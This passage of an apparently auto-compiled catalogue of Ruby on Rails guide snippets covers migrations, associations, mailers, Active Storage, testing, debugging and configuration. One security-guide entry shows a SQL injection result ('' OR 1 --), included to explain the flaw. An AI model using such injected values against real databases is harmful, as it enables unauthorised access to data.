end\nend\n```\n\n----------------------------------------\n\nTITLE: Sample Migration for has_one and belongs_to Association - Ruby\nDESCRIPTION: Provides a migration definition for creating suppliers and accounts tables. The accounts table includes a supplier_id column as a foreign key, supporting the one-to-one relationship. Migration is written for Rails 8.1 syntax and requires ActiveRecord::Migration as a prerequisite.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateSuppliers < ActiveRecord::Migration[8.1]\\n  def change\\n    create_table :suppliers do |t|\\n      t.string :name\\n      t.timestamps\\n    end\\n\\n    create_table :accounts do |t|\\n      t.belongs_to :supplier\\n      t.string :account_number\\n      t.timestamps\\n    end\\n  end\\nend\n```\n\n----------------------------------------\n\nTITLE: Instantiating and Accessing Attributes of Person\nDESCRIPTION: This snippet demonstrates how to create an instance of the `Person` class and access its attributes. It showcases basic attribute assignment and retrieval.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new(name: 'bob', age: '18')\nirb> person.name # => \"bob\"\nirb> person.age  # => \"18\"\n```\n\n----------------------------------------\n\nTITLE: Overriding Layout Per Email Format in Action Mailer (Ruby)\nDESCRIPTION: Shows how to set a specific layout for an individual mailer action and format by passing the layout option to render within the mail format block. The HTML email is rendered with a custom layout, while the text part uses the default. Useful for customizing layout on an as-needed basis.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  def welcome_email\n    mail(to: params[:user].email) do |format|\n      format.html { render layout: \"my_layout\" }\n      format.text\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Action Text Installation - Bash\nDESCRIPTION: These commands install Action Text into a Rails application. It involves running the installer, installing dependencies, and migrating the database. This feature enables rich text editing with multimedia embeds.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_78\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails action_text:install\n$ bundle install\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Rendering Partial without 'partial' and 'locals' Options in Rails\nDESCRIPTION: This example shows a shorthand syntax for rendering a partial when only `partial` and `locals` options are used. Instead of specifying `partial:` and `locals:`, you can directly pass the partial name and local variables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_18\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", locals: { product: @product } %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= render \"product\", product: @product %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= render @product %>\n```\n\n----------------------------------------\n\nTITLE: Initializing Git repo in new Rails app\nDESCRIPTION: When generating a new Rails application, a Git repository will be initialized unless the --skip-git option is provided.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\nrails new my_app # Initializes Git repo\nrails new my_app --skip-git # Skips Git initialization\n```\n\n----------------------------------------\n\nTITLE: Rewriting Where Conditions with Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `rewhere` method to override an existing, named `where` condition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_121\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(out_of_print: true).rewhere(out_of_print: false)\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - param_key (IRB)\nDESCRIPTION: Demonstrates the `param_key` method of `model_name` from `ActiveModel::Naming`. It returns a string to use for params names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_29\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.param_key\n=> \"person\"\n```\n\n----------------------------------------\n\nTITLE: Malicious SQL Injection Result\nDESCRIPTION: The resulting SQL query after a malicious user input exploitation showing how the original query can be manipulated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_31\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM projects WHERE (name = '' OR 1) --')\n```\n\n----------------------------------------\n\nTITLE: Camelize String\nDESCRIPTION: This snippet demonstrates converting a string to camel case using the `camelize` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\n\"product\".camelize    # => \"Product\"\n\"admin_user\".camelize # => \"AdminUser\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Memory Store with Size\nDESCRIPTION: This snippet configures the MemoryStore with a specified size. The `:size` option controls the maximum amount of memory the cache store can use (in megabytes), and cleanup will occur to remove least recently used entries when the limit is reached.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :memory_store, { size: 64.megabytes }\n```\n\n----------------------------------------\n\nTITLE: Namespaced Engine Class\nDESCRIPTION: Engine class definition with namespace isolation using isolate_namespace\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  class Engine < ::Rails::Engine\n    isolate_namespace Blorgh\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Mailer for Gmail SMTP\nDESCRIPTION: Configuration settings for using Gmail as SMTP server in Action Mailer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.delivery_method = :smtp\nconfig.action_mailer.smtp_settings = {\n  address:         \"smtp.gmail.com\",\n  port:            587,\n  domain:          \"example.com\",\n  user_name:       Rails.application.credentials.dig(:smtp, :user_name),\n  password:        Rails.application.credentials.dig(:smtp, :password),\n  authentication:  \"plain\",\n  enable_starttls: true,\n  open_timeout:    5,\n  read_timeout:    5 }\n```\n\n----------------------------------------\n\nTITLE: Running a Single Test with Backtrace in Rails (Bash)\nDESCRIPTION: This command runs a single test file with the `-b` flag, which enables the full backtrace to be displayed in the output. This is useful for debugging failing tests and understanding the call stack leading to the error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test -b test/models/article_test.rb\n```\n\n----------------------------------------\n\nTITLE: Retrieving Associated Object via belongs_to - Ruby\nDESCRIPTION: Retrieves the associated Author for a Book using ActiveRecord association. Assumes @book is an instance of a model with a belongs_to :author association. No external dependencies besides ActiveRecord. Outputs the Author object or nil if no association exists.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n@author = @book.author\n```\n\n----------------------------------------\n\nTITLE: Rendering and Testing HTML Content with ActionView::TestCase\nDESCRIPTION: Demonstrates how to use the new rendered_html parser in ActionView::TestCase to test HTML output from view partials using Nokogiri.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"renders HTML\" do\n  article = Article.create!(title: \"Hello, world\")\n\n  render partial: \"articles/article\", locals: { article: article }\n\n  assert_pattern { rendered_html.at(\"main h1\") => { content: \"Hello, world\" } }\nend\n\ntest \"renders JSON\" do\n  article = Article.create!(title: \"Hello, world\")\n\n  render formats: :json, partial: \"articles/article\", locals: { article: article }\n\n  assert_pattern { rendered_json => { title: \"Hello, world\" } }\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Kamal Registry Password\nDESCRIPTION: This command exports the Docker Hub access token as an environment variable, which is required for Kamal to push the Docker image to the registry.  Replace `your-access-token` with the correct token.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_132\n\nLANGUAGE: bash\nCODE:\n```\nexport KAMAL_REGISTRY_PASSWORD=your-access-token\n```\n\n----------------------------------------\n\nTITLE: Configuring Production Environment for Rails 3.1\nDESCRIPTION: Production environment settings for Rails 3.1, focusing on asset pipeline configuration for production including asset compression, compilation, and digest generation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# Compress JavaScripts and CSS\nconfig.assets.compress = true\n\n# Don't fallback to assets pipeline if a precompiled asset is missed\nconfig.assets.compile = false\n\n# Generate digests for assets URLs\nconfig.assets.digest = true\n\n# Defaults to Rails.root.join(\"public/assets\")\n# config.assets.manifest = YOUR_PATH\n\n# Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)\n# config.assets.precompile `= %w( admin.js admin.css )\n\n\n# Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies.\n# config.force_ssl = true\n```\n\n----------------------------------------\n\nTITLE: Default Controller Rendering in Rails\nDESCRIPTION: Demonstrates how Rails automatically renders views based on conventions.  It shows a basic controller and a corresponding view file. When navigating to the specified route, Rails renders the associated view file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass BooksController < ApplicationController\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Additional Autoload Paths in Rails Application\nDESCRIPTION: This code demonstrates how to add custom directories to the autoload paths in a Rails application configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nmodule MyApplication\n  class Application < Rails::Application\n    config.autoload_paths << \"#{root}/extras\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Specific Behavior to STI Child Models\nDESCRIPTION: Shows how to add methods specific to a child model in Single Table Inheritance, like a honk method for a Car model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\nclass Car < Vehicle\n  def honk\n    \"Beep Beep\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Showing Individual Products (Ruby)\nDESCRIPTION: This Ruby code defines the `show` action in the `ProductsController`. It retrieves a single product from the database based on the `id` parameter passed in the request and assigns it to the `@product` instance variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def index\n    @products = Product.all\n  end\n\n  def show\n    @product = Product.find(params[:id])\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Destroying Active Storage Variants in Ruby\nDESCRIPTION: Demonstrates how to destroy a specific variant of an Active Storage attachment using the variant method with resize parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nUser.first.avatar.variant(resize_to_limit: [100, 100]).destroy\n```\n\n----------------------------------------\n\nTITLE: Running Migrations for a Specific Engine Scope (Bash)\nDESCRIPTION: Executes only the pending migrations associated with a specific engine ('blorgh') by using the `SCOPE` environment variable with the `db:migrate` task. This allows targeted migration runs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_35\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate SCOPE=blorgh\n```\n\n----------------------------------------\n\nTITLE: Iterate with Descending Order using `find_each` in Ruby\nDESCRIPTION: This snippet demonstrates using the `:order` option to iterate through customers in descending order of their primary key. It overrides the default ascending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_each(order: :desc) do |customer|\n  NewsMailer.weekly(customer).deliver_now\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Raw Body in Rails\nDESCRIPTION: This snippet demonstrates how to render raw content without setting a specific content type in Rails. The `render` method sends the string as the body of the response. It's important to note that the default content type will be `text/plain`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nrender body: \"raw\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Weeks Ago and Since in Ruby\nDESCRIPTION: The `weeks_ago` and `weeks_since` methods calculate dates in the past or future by a specified number of weeks. They function similarly to `months_ago` and `months_since`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_151\n\nLANGUAGE: ruby\nCODE:\n```\nDate.new(2010, 5, 24).weeks_ago(1)   # => Mon, 17 May 2010\nDate.new(2010, 5, 24).weeks_since(2) # => Mon, 07 Jun 2010\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Validation Logic with Optional Context - Ruby\nDESCRIPTION: Defines a Ruby method valid? that runs all validations within an optional context, returning true if no errors are found and false otherwise. The method supports context-sensitive validation (e.g., :create, :update), with behavior dependent on the new_record? state and options hashes. Dependencies: a model supporting error tracking and context management, e.g., ActiveModel. The method accepts an optional context parameter and returns a boolean indicating validity.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\n# Runs all the validations within the specified context.\n# Returns true if no errors are found, false otherwise.\n#\n# If the argument is false (default is +nil+), the context is\n# set to <tt>:create</tt> if <tt>new_record?</tt> is true,\n# and to <tt>:update</tt> if it is not.\n#\n# Validations with no <tt>:on</tt> option will run no\n# matter the context. Validations with # some <tt>:on</tt>\n# option will only run in the specified context.\ndef valid?(context = nil)\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Process Email in Mailbox\nDESCRIPTION: This code shows how to access email details using the `Mail` object within a mailbox's `process` method. It provides examples of retrieving the recipient, sender, date, subject, and body of an email.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nirb> mail\n=> #<Mail::Message:33780, Multipart: false, Headers: <Date: Wed, 31 Jan 2024 22:18:40 -0600>, <From: someone@hey.com>, <To: save@example.com>, <Message-ID: <65bb1ba066830_50303a70397e@Bhumis-MacBook-Pro.local.mail>>, <In-Reply-To: >, <Subject: Hello Action Mailbox>, <Mime-Version: 1.0>, <Content-Type: text/plain; charset=UTF-8>, <Content-Transfer-Encoding: 7bit>, <x-original-to: >>\nirb> mail.to\n=> [\"save@example.com\"]\nirb> mail.from\n=> [\"someone@hey.com\"]\nirb> mail.date\n=> Wed, 31 Jan 2024 22:18:40 -0600\nirb> mail.subject\n=> \"Hello Action Mailbox\"\nirb> mail.body.decoded\n=> \"This is the body of the email message.\"\n# mail.decoded, a shorthand for mail.body.decoded, also works\nirb> mail.decoded\n=> \"This is the body of the email message.\"\nirb> mail.body\n=> <Mail::Body:0x00007fc74cbf46c0 @boundary=nil, @preamble=nil, @epilogue=nil, @charset=\"US-ASCII\", @part_sort_order=[\"text/plain\", \"text/enriched\", \"text/html\", \"multipart/alternative\"], @parts=[], @raw_source=\"This is the body of the email message.\", @ascii_only=true, @encoding=\"7bit\">\n```\n\n----------------------------------------\n\nTITLE: Using distinct with has_many through Association in ActiveRecord\nDESCRIPTION: Shows how to use the distinct option with a has_many through association to prevent duplicate records in the collection, which is particularly useful for through associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_130\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  has_many :readings\n  has_many :articles, -> { distinct }, through: :readings\nend\n```\n\n----------------------------------------\n\nTITLE: Namespaced Articles Helper Module\nDESCRIPTION: Definition of the ArticlesHelper module within the Blorgh engine namespace\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  module ArticlesHelper\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Preview Variant of Video Attachment in Rails View (ERB)\nDESCRIPTION: Shows how to display a generated preview variant (thumb) of a video file attachment using image_tag and the preview(:thumb) Active Storage API in a view. Output is a URL for the preview image.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_23\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag user.video.preview(:thumb) %>\n```\n\n----------------------------------------\n\nTITLE: Updating Active Storage Image Transformation for VIPS - Diff\nDESCRIPTION: Shows how to update the resize parameter syntax when migrating from ImageMagick to VIPS for Active Storage variant processing in Rails 7.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_20\n\nLANGUAGE: diff\nCODE:\n```\n- variant(resize: \"100x\")\n+ variant(resize_to_limit: [100, nil])\n```\n\n----------------------------------------\n\nTITLE: Using the `info` Command in the Debugger Session (debug gem)\nDESCRIPTION: Shows the usage and output of the `info` (or `i`) command within the `debug` gem's interactive session (`(rdbg)`). This command provides a summary of the local and instance variables currently accessible within the scope of the breakpoint (the current frame).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_18\n\nLANGUAGE: text\nCODE:\n```\n(rdbg) info    # command\n%self = #<PostsController:0x0000000000af78>\n@_action_has_layout = true\n@_action_name = \"index\"\n@_config = {}\n@_lookup_context = #<ActionView::LookupContext:0x00007fd91a037e38 @details_key=nil, @digest_cache=...\n@_request = #<ActionDispatch::Request GET \"http://localhost:3000/posts\" for 127.0.0.1>\n@_response = #<ActionDispatch::Response:0x00007fd91a03ea08 @mon_data=#<Monitor:0x00007fd91a03e8c8>...\n@_response_body = nil\n@_routes = nil\n@marked_for_same_origin_verification = true\n@posts = []\n@rendered_format = nil\n```\n\n----------------------------------------\n\nTITLE: Using Labeled Form Helper in ERB\nDESCRIPTION: This code snippet shows how to use the `labeled_form_with` helper in an ERB template within a Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_67\n\nLANGUAGE: erb\nCODE:\n```\n<%= labeled_form_with model: @person do |form| %>\n  <%= form.text_field :first_name %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Testing Show Action - Ruby\nDESCRIPTION: This Ruby code shows how to test the `show` action of a controller.  It retrieves an article using a fixture and asserts that the response is successful.  It depends on having fixtures setup for the articles.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"should show article\" do\n  article = articles(:one)\n  get article_url(article)\n  assert_response :success\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Video Tag with video_tag Helper in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `video_tag` helper in Rails to generate an HTML5 `<video>` tag. It loads the video from the `public/videos` directory and sets the `src` attribute of the `<video>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_59\n\nLANGUAGE: erb\nCODE:\n```\n<%= video_tag \"movie.ogg\" %>\n```\n\n----------------------------------------\n\nTITLE: Defining Module Attributes with mattr_accessor in Ruby\nDESCRIPTION: This code shows how to define module-level attributes using `mattr_accessor`.  These attributes are similar to class attributes.  Here, it defines a `logger` attribute for the `ActiveStorage` module, allowing access to and modification of the logger.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ActiveStorage\n  mattr_accessor :logger\nend\n```\n\n----------------------------------------\n\nTITLE: Modified assert_select DOM Nesting Behavior\nDESCRIPTION: Shows changes in how assert_select handles improperly nested HTML elements and their selection behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# content: <div><i><p></i></div>\n\n# before:\nassert_select('div > i')  # => true\nassert_select('div > p')  # => false\nassert_select('i > p')    # => true\n\n# now:\nassert_select('div > i')  # => true\nassert_select('div > p')  # => true\nassert_select('i > p')    # => false\n```\n\n----------------------------------------\n\nTITLE: Initializing Book Model in Ruby\nDESCRIPTION: This snippet shows the initialization of a Book model object in Ruby. This is used to bind a form to a model object using form_with.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n@book = Book.new\n# => #<Book id: nil, title: nil, author: nil>\n```\n\n----------------------------------------\n\nTITLE: Specifying Action Mailer Preview Paths in Ruby\nDESCRIPTION: This code snippet appends a path to the `config.action_mailer.preview_paths` configuration option. This allows Rails to search for mailer previews in the specified directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.preview_paths << \"#{Rails.root}/lib/mailer_previews\"\n```\n\n----------------------------------------\n\nTITLE: String Inquiry\nDESCRIPTION: This snippet converts a string into a StringInquirer object, allowing for prettier equality checks using predicate methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\n\"production\".inquiry.production? # => true\n\"active\".inquiry.inactive?       # => false\n```\n\n----------------------------------------\n\nTITLE: Enabling Verbose Active Job Enqueue Logs in Ruby\nDESCRIPTION: Configures Rails Active Job to log the source code location whenever a background job is enqueued. This setting is typically placed in `application.rb` or an environment-specific initializer (e.g., `config/environments/development.rb`). It is useful for debugging in development but not recommended for production environments due to potential performance overhead.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_8\n\nLANGUAGE: rb\nCODE:\n```\nconfig.active_job.verbose_enqueue_logs = true\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for AND Condition with Relations in Rails\nDESCRIPTION: This SQL query is the result of the `and` method applied to two relations. The `AND` operator combines two `IN` clauses, resulting in a search for records that satisfy both conditions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_78\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.id IN (1, 2) AND customers.id IN (2, 3))\n```\n\n----------------------------------------\n\nTITLE: Using capture Helper in Rails Views\nDESCRIPTION: The capture helper allows extracting part of a template into a variable. This variable can then be used anywhere in templates, layouts, or helpers. The return of capture is the string generated by the block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_41\n\nLANGUAGE: html+erb\nCODE:\n```\n<% @greeting = capture do %>\n  <p>Welcome! The date and time is <%= Time.current %></p>\n<% end %>\n```\n\nLANGUAGE: html+erb\nCODE:\n```\n<html>\n  <head>\n    <title>Welcome!</title>\n  </head>\n  <body>\n    <%= @greeting %>\n  </body>\n</html>\n```\n\nLANGUAGE: ruby\nCODE:\n```\n@greeting\n# => \"Welcome to my shiny new web page! The date and time is 2018-09-06 11:09:16 -0500\"\n```\n\n----------------------------------------\n\nTITLE: Programming Debugging Workflow with Command Chaining\nDESCRIPTION: Demonstrates how to script a debugging workflow by chaining commands together. This example sets up a catch breakpoint for ActiveRecord::RecordInvalid exceptions and displays a backtrace when triggered, all defined in a single line.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\ndef create\n  debugger(do: \"catch ActiveRecord::RecordInvalid do: bt 10\")\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Job Existing Behavior in Rails\nDESCRIPTION: This snippet shows how to configure the existing behavior for Active Job in a Rails application. It sets the configuration option to false and provides documentation for the configuration guide.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\n# Rails.application.config.active_job.existing_behavior = false\n```\n\nLANGUAGE: markdown\nCODE:\n```\n#### `config.active_job.existing_behavior\n\n| Starting with version | The default value is |\n| --------------------- | -------------------- |\n| (original)            | `true`               |\n| 7.1                   | `false`              |\n```\n\n----------------------------------------\n\nTITLE: Clearing Default Security Headers in Ruby on Rails\nDESCRIPTION: This snippet shows how to remove all default security headers in a Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.default_headers.clear\n```\n\n----------------------------------------\n\nTITLE: Migrating the Database Schema in Dummy App - Rails CLI - Bash\nDESCRIPTION: Runs database migrations in the dummy Rails app to ensure tables for Hickwall and Wickwall models are created. This step is required before models can be saved and tested. Only dependencies are Rails and the generated migration files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\n$ cd test/dummy\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Overriding class_attribute at the instance level\nDESCRIPTION: This Ruby code snippet shows how `class_attribute` can be accessed and overridden at the instance level. Modifying the instance variable does not change the class attribute itself but overrides it for that specific instance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nA.x = 1\n\na1 = A.new\na2 = A.new\na2.x = 2\n\na1.x # => 1, comes from A\na2.x # => 2, overridden in a2\n```\n\n----------------------------------------\n\nTITLE: Including Entryable Module in Subclasses for Rails Delegation\nDESCRIPTION: Demonstrates how to include the Entryable module in Message and Comment subclasses to complete the delegated type relationship. This enables the polymorphic association between these models and the Entry model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_88\n\nLANGUAGE: ruby\nCODE:\n```\nclass Message < ApplicationRecord\n  include Entryable\nend\n\nclass Comment < ApplicationRecord\n  include Entryable\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Scaffold Generation (Bash)\nDESCRIPTION: This bash command demonstrates how to generate a scaffold for an `article` resource in a Rails application. It creates a controller, model, and associated views (index, edit, show, new, and a form partial).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_0\n\nLANGUAGE: Bash\nCODE:\n```\n$ bin/rails generate scaffold article\n      [...]\n      invoke  scaffold_controller\n      create    app/controllers/articles_controller.rb\n      invoke    erb\n      create      app/views/articles\n      create      app/views/articles/index.html.erb\n      create      app/views/articles/edit.html.erb\n      create      app/views/articles/show.html.erb\n      create      app/views/articles/new.html.erb\n      create      app/views/articles/_form.html.erb\n      [...]\n```\n\n----------------------------------------\n\nTITLE: Storing and Indexing tsvector as a Virtual Column - ActiveRecord Migration - Ruby\nDESCRIPTION: Shows how to add a virtual (generated) column for the tsvector representation of documents, with a GIN index for search. Compatible with PostgreSQL 12+ which supports stored generated columns. Requires a proper Rails migration context and disables manual updating of the vector column. Inputs are document fields; output is an efficiently indexed, automatically updated tsvector column for fast search.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_documents.rb\\ncreate_table :documents do |t|\\n  t.string :title\\n  t.string :body\\n\\n  t.virtual :textsearchable_index_col,\\n            type: :tsvector, as: \\\"to_tsvector('english', title || ' ' || body)\\\", stored: true\\nend\\n\\nadd_index :documents, :textsearchable_index_col, using: :gin, name: \\\"documents_idx\\\"\\n\\n# Usage\\nDocument.create(title: \\\"Cats and Dogs\\\", body: \\\"are nice!\\\")\\n\\n## all documents matching 'cat & dog'\\nDocument.where(\\\"textsearchable_index_col @@ to_tsquery(?)\\\", \\\"cat & dog\\\")\n```\n\n----------------------------------------\n\nTITLE: Inclusion Validation with Beginless Ranges in Ruby\nDESCRIPTION: Demonstrates using beginless ranges with inclusion validators using a lambda that returns a date range.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nvalidates_inclusion_of :birth_date, in: -> { (..Date.today) }\n```\n\n----------------------------------------\n\nTITLE: Using video_tag Helper in Rails\nDESCRIPTION: The video_tag helper generates HTML video tags with sources. It can accept a single string source or an array of sources, and supports various options like controls. Sources can be full paths, files in the public videos directory, or Active Storage attachments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nvideo_tag(\"trailer\")\n# => <video src=\"/videos/trailer\"></video>\n\nvideo_tag([\"trailer.ogg\", \"trailer.flv\"])\n# => <video><source src=\"/videos/trailer.ogg\" /><source src=\"/videos/trailer.flv\" /></video>\n\nvideo_tag(\"trailer\", controls: true)\n# => <video controls=\"controls\" src=\"/videos/trailer\"></video>\n```\n\n----------------------------------------\n\nTITLE: Running a Single Test File with a Specific Seed in Bash (Action Mailer)\nDESCRIPTION: Runs a specific test file (`test/mail_layout_test.rb`) within the Action Mailer component using a specific randomization seed (15002) provided via the `SEED` environment variable. This combines file-specific testing with seed-based reproduction.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\n$ cd actionmailer\n$ SEED=15002 bin/test test/mail_layout_test.rb\n```\n\n----------------------------------------\n\nTITLE: Configuring Solid Cache with MySQL/PostgreSQL in database.yml\nDESCRIPTION: This snippet demonstrates configuring Solid Cache to use a separate MySQL or PostgreSQL database in the `config/database.yml` file, sharing credentials with the primary database.\nSOURCE: 